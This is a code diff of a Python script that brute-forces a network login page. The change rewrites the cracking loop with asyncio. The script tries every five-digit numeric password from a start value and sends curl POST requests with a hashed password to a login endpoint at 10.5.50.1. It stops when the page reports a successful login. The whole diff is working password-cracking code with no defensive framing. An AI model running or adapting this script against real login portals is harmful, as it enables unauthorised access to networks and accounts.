@@ -204,6 +204,44 @@ import requests # as curl alternative (migration to faster_than_requests or curl
 import re # regex
 import datetime
 import subprocess
+import asyncio
+
+async def get_post(username, hexa, password):
+    start_time_pass = datetime.datetime.now()
+    cmd = (f"""curl -X POST -d "username={username}" -d "password={hexa}" http://10.5.50.1/login""")
+
+    try:
+        process = await asyncio.create_subprocess_shell(
+            cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+
+        try:
+            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=0.5)
+        except asyncio.TimeoutError:
+            process.kill()
+            await process.communicate()
+            print(f"({password}): Timeout (>500ms) — request canceled.")
+            return
+
+        time_offset = (datetime.datetime.now() - start_time_pass).total_seconds() * 1000
+        print(f"({password}): post url done in {round(time_offset, 2)}ms.")
+        # Optionally, print stdout.decode() or stderr.decode()
+        response = stdout.decode().strip()
+
+        if "You are logged in" in response:
+            print(f"({password}): Login successful.")
+
+            # program run time
+            
+            return 1
+        else:
+            print(f"({password}): Login failed. ")
+            return 0
+    
+    except Exception as e:
+        print(f"({password}): Error occurred: {e}")
 
 start_time = datetime.datetime.now()
 print("Cracking started: "+start_time.strftime("%d-%m-%Y %H:%M:%S:%f"))
@@ -223,7 +261,7 @@ START = 19090
 
 END = 99999
 
-for i in range(max(10000, START), min(END, 99999), 1):
+async def solve(i):
     password = str(i)
     start_time_pass = datetime.datetime.now()
 
@@ -239,9 +277,9 @@ for i in range(max(10000, START), min(END, 99999), 1):
     if(prefix is None or suffix is None):
         # if failed to find prefix or suffix (this needs to be fixed according to the page 
         print("Already logged in.")
-        logout = logout()
+        log = logout()
         print("Successfully logged out.")
-        break
+        return 0
 
     # time offset
           
@@ -291,30 +329,25 @@ for i in range(max(10000, START), min(END, 99999), 1):
 ####            }
 ####        )
 
-    cmd = (f"""curl -X POST -d "username={username}" -d "password={hexa}" http://10.5.50.1/login""")
-    # print(cmd) # edebug
-    response = subprocess.check_output(cmd, shell=True, text=True)
-    
-    # print(r.text) # debug
-
-    # time offset
-
-    time_offset = (datetime.datetime.now() - start_time_pass).total_seconds()*1000
-    print(f"({password}): post url done in " + str(round(time_offset - time_offset2, 2)) + "ms.")
-
     # check if logged in
-
-    if "You are logged in" in response:
-        print(f"({password}): Login successful.")
-
-        # program run time
-        
+    
+    output = await get_post(username, hexa, password)
+    time_offset = (datetime.datetime.now() - start_time_pass).total_seconds()*1000
+    if output == 1:
         end_time = datetime.datetime.now()
         print(str(end_time - start_time))
-
-        logout = logout()
-        print("Logged out.")
-        
-        break
+                
+        return 0
     else:
-        print(f"({password}): Login failed. ")
+        print(f"({password}): post url done in " + str(round(time_offset - time_offset2, 2)) + "ms.")
+
+async def main():
+    for i in range(max(10000, START), min(END, 99999), 1):
+        num = await solve(i)
+        if num == 0:
+            
+            log = logout()
+            print("Logged out.")
+            break
+
+asyncio.run(main())
